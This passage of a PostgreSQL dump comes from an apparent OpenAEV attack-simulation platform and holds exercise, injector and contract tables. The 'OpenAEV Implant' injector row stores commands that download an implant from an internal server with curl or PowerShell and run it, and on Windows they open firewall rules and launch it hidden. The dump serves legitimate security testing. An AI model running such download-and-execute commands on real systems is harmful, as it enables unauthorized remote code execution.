cfa16c11-25c3-49fe-bc76-f196e4df6e21	d522efe3-f72a-458e-8ce8-a0b2a8889ad7	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"OK\\r\\n","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-16 08:52:08.849212	2026-01-16 08:52:09.028202+00	2026-01-16 08:52:09.028211+00	{}	\N
3e5483c9-7735-438f-baa6-8967c6daa270	d522efe3-f72a-458e-8ce8-a0b2a8889ad7	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"","exit_code":0}	CLEANUP_EXECUTION	SUCCESS	2026-01-16 08:45:29.916212	2026-01-16 08:52:09.575958+00	2026-01-16 08:52:09.575965+00	{}	\N
29790d27-fab3-462a-bbe4-b53303131a20	d522efe3-f72a-458e-8ce8-a0b2a8889ad7	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-16 08:52:09.617212	2026-01-16 08:52:09.608642+00	2026-01-16 08:52:09.608648+00	{}	\N
\.


--
-- Data for Name: executors; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.executors (executor_id, executor_created_at, executor_updated_at, executor_name, executor_type, executor_platforms, executor_doc, executor_background_color) FROM stdin;
2f9a0936-c327-4e95-b406-d161d32a2501	2026-01-09 14:19:18.87052+00	2026-01-09 14:19:18.870525+00	OpenAEV Agent	openaev_agent	{Windows,Linux,MacOS}	https://docs.openaev.io/latest/usage/openaev-agent/	#001BDB
\.


--
-- Data for Name: exercise_mails_reply_to; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercise_mails_reply_to (exercise_id, exercise_reply_to) FROM stdin;
377d029e-ce0e-404a-851b-03988fbb3fe2	contact@openaev.io
\.


--
-- Data for Name: exercises; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercises (exercise_id, exercise_name, exercise_subtitle, exercise_description, exercise_start_date, exercise_end_date, exercise_mail_from, exercise_message_header, exercise_message_footer, exercise_created_at, exercise_updated_at, exercise_status, exercise_logo_dark, exercise_logo_light, exercise_lessons_anonymized, exercise_category, exercise_severity, exercise_main_focus, exercise_pause_date, exercise_launch_order, exercise_custom_dashboard, exercise_security_coverage) FROM stdin;
377d029e-ce0e-404a-851b-03988fbb3fe2	Test Scenario			2026-01-09 15:30:00+00	2026-01-09 15:54:02+00	no-reply@openaev.io	EN-TÊTE DE SIMULATION	PIED DE PAGE DE SIMULATION	2026-01-09 15:29:28.177896+00	2026-01-09 15:54:01.889696+00	FINISHED	\N	\N	f	attack-scenario	high	incident-response	\N	13	71de8342-011e-4cac-a8ab-477cb0770756	\N
\.


--
-- Data for Name: exercises_documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercises_documents (exercise_id, document_id) FROM stdin;
\.


--
-- Data for Name: exercises_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercises_tags (exercise_id, tag_id) FROM stdin;
\.


--
-- Data for Name: exercises_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercises_teams (exercise_id, team_id) FROM stdin;
\.


--
-- Data for Name: exercises_teams_users; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.exercises_teams_users (exercise_id, team_id, user_id) FROM stdin;
\.


--
-- Data for Name: findings; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.findings (finding_id, finding_field, finding_type, finding_value, finding_labels, finding_inject_id, finding_created_at, finding_updated_at, finding_name) FROM stdin;
\.


--
-- Data for Name: findings_assets; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.findings_assets (finding_id, asset_id) FROM stdin;
\.


--
-- Data for Name: findings_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.findings_tags (finding_id, tag_id) FROM stdin;
\.


--
-- Data for Name: findings_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.findings_teams (finding_id, team_id) FROM stdin;
\.


--
-- Data for Name: findings_users; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.findings_users (finding_id, user_id) FROM stdin;
\.


--
-- Data for Name: grants; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.grants (grant_id, grant_group, grant_name, grant_resource, grant_resource_type) FROM stdin;
\.


--
-- Data for Name: groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.groups (group_id, group_name, group_description, group_default_user_assign) FROM stdin;
0b4db570-fdf4-44e9-8daa-39130189fec8	STIX bundle processors	Group for granting access rights to the STIX bundle API	f
\.


--
-- Data for Name: groups_roles; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.groups_roles (role_id, group_id) FROM stdin;
2c24790b-fa69-4565-8dc8-b00f85ca47d5	0b4db570-fdf4-44e9-8daa-39130189fec8
\.


--
-- Data for Name: import_mappers; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.import_mappers (mapper_id, mapper_name, mapper_inject_type_column, mapper_created_at, mapper_updated_at) FROM stdin;
\.


--
-- Data for Name: indexing_status; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.indexing_status (indexing_status_type, indexing_status_indexing_date) FROM stdin;
attack-pattern	2026-01-09 14:19:27.216887+00
asset-group	2026-01-09 14:19:23.090241+00
tag	2026-01-09 14:20:15.835541+00
team	2026-01-16 08:25:14.682647+00
expectation-inject	2026-01-16 08:52:09.612514+00
endpoint	2026-01-16 10:17:50.79326+00
inject	2026-01-16 10:18:33.259764+00
scenario	2026-01-16 10:18:33.259764+00
simulation	2026-01-09 15:54:01.889696+00
\.


--
-- Data for Name: inject_importers; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.inject_importers (importer_id, importer_mapper_id, importer_import_type_value, importer_injector_contract_id, importer_created_at, importer_updated_at) FROM stdin;
\.


--
-- Data for Name: injectors; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injectors (injector_id, injector_created_at, injector_updated_at, injector_name, injector_type, injector_external, injector_custom_contracts, injector_category, injector_executor_commands, injector_executor_clear_commands, injector_payloads, injector_dependencies) FROM stdin;
41b4dd55-5bd1-4614-98cd-9e3770753306	2026-01-09 14:19:18.487648+00	2026-01-15 21:36:23.868651+00	Email	openaev_email	f	f	communication	\N	\N	f	{SMTP,IMAP}
8d932e36-353c-48fa-ba6f-86cb7b02ed19	2026-01-09 14:19:17.40529+00	2026-01-15 21:36:22.834574+00	Media pressure	openaev_channel	f	f	media-pressure	\N	\N	f	{SMTP,SMTP}
6981a39d-e219-4016-a235-cf7747994abc	2026-01-09 14:19:17.977485+00	2026-01-15 21:36:23.358696+00	Manual	openaev_manual	f	t	generic	\N	\N	f	{}
49229430-b5b5-431f-ba5b-f36f599b0144	2026-01-09 14:19:18.128503+00	2026-01-15 21:36:23.426476+00	OpenAEV Implant	openaev_implant	f	f	simulation-implant	"Linux.arm64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");filename=oaev-implant-#{inject}-agent-#{agent};server=\\"http://10.0.0.23:8080\\";token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";unsecured_certificate=\\"false\\";with_proxy=\\"false\\";curl -s -X GET \\"http://10.0.0.23:8080/api/implant/openaev/linux/arm64?injectId=#{inject}&agentId=#{agent}\\" > $location/$filename;chmod +x $location/$filename;$location/$filename --uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject} &", "MacOS.arm64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");filename=oaev-implant-#{inject}-agent-#{agent};server=\\"http://10.0.0.23:8080\\";token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";unsecured_certificate=\\"false\\";with_proxy=\\"false\\";curl -s -X GET \\"http://10.0.0.23:8080/api/implant/openaev/macos/arm64?injectId=#{inject}&agentId=#{agent}\\" > $location/$filename;chmod +x $location/$filename;$location/$filename --uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject} &", "Linux.x86_64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");filename=oaev-implant-#{inject}-agent-#{agent};server=\\"http://10.0.0.23:8080\\";token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";unsecured_certificate=\\"false\\";with_proxy=\\"false\\";curl -s -X GET \\"http://10.0.0.23:8080/api/implant/openaev/linux/x86_64?injectId=#{inject}&agentId=#{agent}\\" > $location/$filename;chmod +x $location/$filename;$location/$filename --uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject} &", "MacOS.x86_64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");filename=oaev-implant-#{inject}-agent-#{agent};server=\\"http://10.0.0.23:8080\\";token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";unsecured_certificate=\\"false\\";with_proxy=\\"false\\";curl -s -X GET \\"http://10.0.0.23:8080/api/implant/openaev/macos/x86_64?injectId=#{inject}&agentId=#{agent}\\" > $location/$filename;chmod +x $location/$filename;$location/$filename --uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject} &", "Windows.arm64"=>"[Net.ServicePointManager]::SecurityProtocol += [Net.SecurityProtocolType]::Tls12;$x=\\"#{location}\\";$location=$x.Replace(\\"\\\\oaev-agent-caldera.exe\\", \\"\\");[Environment]::CurrentDirectory = $location;$filename=\\"oaev-implant-#{inject}-agent-#{agent}.exe\\";$token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";$server=\\"http://10.0.0.23:8080\\";$unsecured_certificate=\\"false\\";$with_proxy=\\"false\\";$url=\\"http://10.0.0.23:8080/api/implant/openaev/windows/arm64?injectId=#{inject}&agentId=#{agent}\\";$wc=New-Object System.Net.WebClient;$data=$wc.DownloadData($url);[io.file]::WriteAllBytes($filename,$data) | Out-Null;Remove-NetFirewallRule -DisplayName \\"Allow OpenAEV Inbound\\";New-NetFirewallRule -DisplayName \\"Allow OpenAEV Inbound\\" -Direction Inbound -Program \\"$location\\\\$filename\\" -Action Allow | Out-Null;Remove-NetFirewallRule -DisplayName \\"Allow OpenAEV Outbound\\";New-NetFirewallRule -DisplayName \\"Allow OpenAEV Outbound\\" -Direction Outbound -Program \\"$location\\\\$filename\\" -Action Allow | Out-Null;Start-Process -FilePath \\"$location\\\\$filename\\" -ArgumentList \\"--uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject}\\" -WindowStyle hidden;", "Windows.x86_64"=>"[Net.ServicePointManager]::SecurityProtocol += [Net.SecurityProtocolType]::Tls12;$x=\\"#{location}\\";$location=$x.Replace(\\"\\\\oaev-agent-caldera.exe\\", \\"\\");[Environment]::CurrentDirectory = $location;$filename=\\"oaev-implant-#{inject}-agent-#{agent}.exe\\";$token=\\"fd724d18-3854-426d-b20b-4b92f9b9f430\\";$server=\\"http://10.0.0.23:8080\\";$unsecured_certificate=\\"false\\";$with_proxy=\\"false\\";$url=\\"http://10.0.0.23:8080/api/implant/openaev/windows/x86_64?injectId=#{inject}&agentId=#{agent}\\";$wc=New-Object System.Net.WebClient;$data=$wc.DownloadData($url);[io.file]::WriteAllBytes($filename,$data) | Out-Null;Remove-NetFirewallRule -DisplayName \\"Allow OpenAEV Inbound\\";New-NetFirewallRule -DisplayName \\"Allow OpenAEV Inbound\\" -Direction Inbound -Program \\"$location\\\\$filename\\" -Action Allow | Out-Null;Remove-NetFirewallRule -DisplayName \\"Allow OpenAEV Outbound\\";New-NetFirewallRule -DisplayName \\"Allow OpenAEV Outbound\\" -Direction Outbound -Program \\"$location\\\\$filename\\" -Action Allow | Out-Null;Start-Process -FilePath \\"$location\\\\$filename\\" -ArgumentList \\"--uri $server --token $token --unsecured-certificate $unsecured_certificate --with-proxy $with_proxy --agent-id #{agent} --inject-id #{inject}\\" -WindowStyle hidden;"	"Linux.arm64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");cd \\"$location\\"; rm *implant*", "MacOS.arm64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");cd \\"$location\\"; rm *implant*", "Linux.x86_64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");cd \\"$location\\"; rm *implant*", "MacOS.x86_64"=>"x=\\"#{location}\\";location=$(echo \\"$x\\" | sed \\"s#/openaev-caldera-agent##\\");cd \\"$location\\"; rm *implant*", "Windows.arm64"=>"$x=\\"#{location}\\";$location=$x.Replace(\\"\\\\oaev-agent-caldera.exe\\", \\"\\");[Environment]::CurrentDirectory = $location;cd \\"$location\\";Get-ChildItem -Recurse -Filter *implant* | Remove-Item", "Windows.x86_64"=>"$x=\\"#{location}\\";$location=$x.Replace(\\"\\\\oaev-agent-caldera.exe\\", \\"\\");[Environment]::CurrentDirectory = $location;cd \\"$location\\";Get-ChildItem -Recurse -Filter *implant* | Remove-Item"	t	{}
2cbc77af-67f2-46af-bfd2-755d06a46da0	2026-01-09 14:19:18.251491+00	2026-01-15 21:36:23.757889+00	OpenCTI	openaev_opencti	f	t	incident-response	\N	\N	f	{}
49229430-b5b5-431f-ba5b-f36f599b0233	2026-01-09 14:19:18.383615+00	2026-01-15 21:36:23.806865+00	Challenges	openaev_challenge	f	f	capture-the-flag	\N	\N	f	{SMTP,IMAP}
76f8f4d6-9f6f-4e61-befc-48f735876a4a	2026-01-09 14:19:36.822111+00	2026-01-16 10:18:19.740235+00	Nmap	openaev_nmap	t	f	\N	\N	\N	f	\N
e1bad898-9804-427d-99e4-dc32c5f2898d	2026-01-09 14:19:36.678394+00	2026-01-16 10:18:33.243677+00	Nuclei	openaev_nuclei	t	f	\N	\N	\N	f	\N
\.


--
-- Data for Name: injectors_contracts; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injectors_contracts (injector_contract_id, injector_contract_created_at, injector_contract_updated_at, injector_contract_labels, injector_contract_manual, injector_contract_content, injector_id, injector_contract_atomic_testing, injector_contract_custom, injector_contract_platforms, injector_contract_needs_executor, injector_contract_payload, injector_contract_import_available, injector_contract_external_id) FROM stdin;
fb5e49a2-6366-4492-b69a-f9b9f39a533e	2026-01-09 14:19:17.794071+00	2026-01-09 14:19:17.794106+00	"en"=>"Publish a media pressure", "fr"=>"Publier de la pression médiatique"	f	{"config":{"type":"openaev_channel","expose":true,"label":{"fr":"Pression médiatique","en":"Media pressure"},"color_dark":"#ff9800","color_light":"#ff9800"},"label":{"fr":"Publier de la pression médiatique","en":"Publish a media pressure"},"manual":false,"fields":[{"key":"teams","label":"Teams","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"team"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"},{"key":"articles","label":"Articles","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"article"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"ARTICLE","expectation_name":"Expect targets to read the article(s)","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":86400}],"type":"expectation"},{"key":"emailing","label":"Send email","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":true,"type":"checkbox"},{"key":"subject","label":"Subject","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":["emailing"],"mandatoryConditionValues":{"emailing":"true"},"visibleConditionFields":["emailing"],"visibleConditionValues":{"emailing":"true"},"linkedFields":[],"linkedValues":[],"defaultValue":"New media pressure entries published for ${user.email}","type":"text"},{"key":"body","label":"Body","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":["emailing"],"mandatoryConditionValues":{"emailing":"true"},"visibleConditionFields":["emailing"],"visibleConditionValues":{"emailing":"true"},"linkedFields":[],"linkedValues":[],"defaultValue":"    Dear player,<br /><br />\\n    New media pressure entries have been published.<br /><br />\\n    <#list articles as article>\\n        - <a href=\\"${article.uri}\\">${article.name}</a><br />\\n    </#list>\\n    <br/><br/>\\n    Kind regards,<br />\\n    The animation team\\n","richText":true,"type":"textarea"},{"key":"encrypted","label":"Encrypted","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":["emailing"],"visibleConditionValues":{"emailing":"true"},"linkedFields":[],"linkedValues":[],"defaultValue":false,"type":"checkbox"}],"variables":[{"key":"articles","label":"List of articles published by the injection","type":"Object","cardinality":"n","children":[{"key":"article.id","label":"Id of the article in the platform","type":"String","cardinality":"1","children":[]},{"key":"article.name","label":"Name of the article","type":"String","cardinality":"1","children":[]},{"key":"article.uri","label":"Http user link to access the article","type":"String","cardinality":"1","children":[]}]},{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"fb5e49a2-6366-4492-b69a-f9b9f39a533e","contract_attack_patterns_external_ids":[],"is_atomic_testing":false,"needs_executor":false,"platforms":["Internal"]}	8d932e36-353c-48fa-ba6f-86cb7b02ed19	f	f	{Internal}	f	\N	f	\N
d02e9132-b9d0-4daa-b3b1-4b9871f8472c	2026-01-09 14:19:18.002317+00	2026-01-09 14:19:18.002342+00	"en"=>"Manual", "fr"=>"Manuel"	t	{"config":{"type":"openaev_manual","expose":true,"label":{"fr":"Manuel","en":"Manual"},"color_dark":"#009688","color_light":"#009688"},"label":{"fr":"Manuel","en":"Manual"},"manual":true,"fields":[{"key":"teams","label":"Teams","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":["expectations"],"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"team"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"d02e9132-b9d0-4daa-b3b1-4b9871f8472c","contract_attack_patterns_external_ids":[],"is_atomic_testing":false,"needs_executor":false,"platforms":["Internal"]}	6981a39d-e219-4016-a235-cf7747994abc	f	f	{Internal}	f	\N	f	\N
88db2075-ae49-4fe9-a64c-08da2ed07637	2026-01-09 14:19:18.315688+00	2026-01-09 14:19:18.315759+00	"en"=>"Create a new case", "fr"=>"Créer un nouveau case"	f	{"config":{"type":"openaev_opencti","expose":true,"label":{"fr":"OpenCTI","en":"OpenCTI"},"color_dark":"#0fbcff","color_light":"#001bda"},"label":{"fr":"Créer un nouveau case","en":"Create a new case"},"manual":false,"fields":[{"key":"name","label":"Name","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","type":"text"},{"key":"description","label":"Description","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","richText":true,"type":"textarea"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[],"type":"expectation"}],"variables":[{"key":"document_uri","label":"Http user link to upload the document (only for document expectation)","type":"String","cardinality":"1","children":[]},{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"88db2075-ae49-4fe9-a64c-08da2ed07637","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":false,"platforms":["Service"]}	2cbc77af-67f2-46af-bfd2-755d06a46da0	t	f	{Service}	f	\N	f	\N
b535f011-3a03-46e7-800a-74f01cd8865e	2026-01-09 14:19:18.320305+00	2026-01-09 14:19:18.320323+00	"en"=>"Create a new report", "fr"=>"Créer un nouveau rapport"	f	{"config":{"type":"openaev_opencti","expose":true,"label":{"fr":"OpenCTI","en":"OpenCTI"},"color_dark":"#0fbcff","color_light":"#001bda"},"label":{"fr":"Créer un nouveau rapport","en":"Create a new report"},"manual":false,"fields":[{"key":"name","label":"Name","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","type":"text"},{"key":"description","label":"Description","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"","richText":true,"type":"textarea"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[],"type":"expectation"}],"variables":[{"key":"document_uri","label":"Http user link to upload the document (only for document expectation)","type":"String","cardinality":"1","children":[]},{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"b535f011-3a03-46e7-800a-74f01cd8865e","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":false,"platforms":["Service"]}	2cbc77af-67f2-46af-bfd2-755d06a46da0	t	f	{Service}	f	\N	f	\N
f8e70b27-a69c-4b9f-a2df-e217c36b3981	2026-01-09 14:19:18.407865+00	2026-01-09 14:19:18.407894+00	"en"=>"Publish challenges", "fr"=>"Publier des challenges"	f	{"config":{"type":"openaev_challenge","expose":true,"label":{"fr":"Challenge","en":"Challenge"},"color_dark":"#e91e63","color_light":"#e91e63"},"label":{"fr":"Publier des challenges","en":"Publish challenges"},"manual":false,"fields":[{"key":"challenges","label":"Challenges","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"challenge"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"CHALLENGE","expectation_name":"Expect targets to complete the challenge(s)","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":86400}],"type":"expectation"},{"key":"subject","label":"Subject","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"New challenges published for ${user.email}","type":"text"},{"key":"body","label":"Body","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"    Dear player,<br /><br />\\n    News challenges have been published.<br /><br />\\n    <#list challenges as challenge>\\n        - <a href=\\"${challenge.uri}\\">${challenge.name}</a><br />\\n    </#list>\\n   